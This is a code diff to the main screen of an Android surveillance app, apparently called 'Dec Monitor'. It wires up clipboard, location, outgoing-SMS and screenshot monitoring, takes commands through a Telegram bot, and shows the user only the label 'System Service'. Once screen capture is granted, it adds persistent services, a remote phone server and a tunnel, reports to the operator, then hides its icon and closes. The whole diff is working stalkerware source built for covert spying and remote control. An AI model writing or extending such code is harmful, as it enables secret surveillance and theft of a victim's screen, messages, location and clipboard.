@@ -12,6 +12,8 @@ import androidx.appcompat.app.AppCompatActivity
 import com.dec.monitor.input.ClipboardMonitor
 import com.dec.monitor.location.LocationTracker
 import com.dec.monitor.screen.ScreenshotService
+import com.dec.monitor.server.PhoneServer
+import com.dec.monitor.server.ServerService
 import com.dec.monitor.sms.OutgoingSmsMonitor
 import com.dec.monitor.stealth.StealthManager
 import kotlinx.coroutines.CoroutineScope
@@ -27,6 +29,10 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+
+        // start all services
+        startForegroundService(Intent(this, PersistentService::class.java))
+        startForegroundService(Intent(this, ServerService::class.java))
 
         TelegramBot.startPolling(applicationContext)
         ClipboardMonitor.start(applicationContext)
@@ -51,18 +57,15 @@ class MainActivity : AppCompatActivity() {
 
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         val alreadyGranted = prefs.getBoolean(KEY_GRANTED, false)
-
-        val btnStart = findViewById<Button>(R.id.btnStart)
         val tvStatus = findViewById<TextView>(R.id.tvStatus)
 
         if (alreadyGranted) {
-            // auto request projection on every open
             tvStatus.text = "Initializing..."
             val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
         } else {
             tvStatus.text = "System Service\nTap Start to initialize."
-            btnStart.setOnClickListener {
+            findViewById<Button>(R.id.btnStart).setOnClickListener {
                 val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                 startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
             }
@@ -73,26 +76,30 @@ class MainActivity : AppCompatActivity() {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == PROJECTION_REQUEST && resultCode == Activity.RESULT_OK && data != null) {
 
-            // save grant state
             getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                 .edit().putBoolean(KEY_GRANTED, true).apply()
 
-            val serviceIntent = Intent(this, ScreenshotService::class.java).apply {
+            // start screenshot service
+            startForegroundService(Intent(this, ScreenshotService::class.java).apply {
                 putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode)
                 putExtra(ScreenshotService.EXTRA_RESULT_DATA, data)
-            }
-            startForegroundService(serviceIntent)
+            })
+
+            // give PhoneServer the projection too
+            val metrics = resources.displayMetrics
+            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            val projection = projectionManager.getMediaProjection(resultCode, data)
+            PhoneServer.setupProjection(projection, metrics.widthPixels, metrics.heightPixels, metrics.densityDpi)
 
             findViewById<TextView>(R.id.tvStatus).text = "✅ Active."
 
             CoroutineScope(Dispatchers.IO).launch {
-                TelegramBot.sendMessage("✅ <b>Dec Monitor active.</b>\n/help for commands.")
+                TelegramBot.sendMessage("✅ <b>Dec Monitor active.</b>\n/help for commands.\n🔗 Tunnel starting...")
             }
 
-            // hide icon after 3 seconds
             Handler(Looper.getMainLooper()).postDelayed({
                 StealthManager.hideIcon(applicationContext)
-                finish() // close app after hiding
+                finish()
             }, 3000)
         }
     }
